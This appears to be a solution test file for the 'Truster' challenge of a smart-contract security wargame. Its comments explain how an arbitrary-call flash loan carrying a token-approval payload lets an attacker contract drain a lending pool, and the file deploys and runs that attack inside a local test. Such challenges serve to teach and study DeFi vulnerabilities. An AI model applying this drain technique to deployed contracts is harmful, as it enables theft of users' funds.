const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    // The flash loan contract accepts a custom function to call and a payload as its argument
    // allows to call any contract function on the flash loan contract’s behalf which can be exploited
    // ExploitTruster contract creates uses data as the infinite approval for token transfers
    // takes a flashLoan of 0 so no repay has to happen and passes the data
    // The context under which approve is executed is the flash loan contract because it is the one calling it
    // Then the contract uses transferFrom to withdraw all pool balance
    const ExploitTruster = await ethers.getContractFactory(
      "ExploitTruster",
      deployer
    );
    const exploitTruster = (await ExploitTruster.deploy()).connect(attacker);
    await exploitTruster.attack(this.pool.address, this.token.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
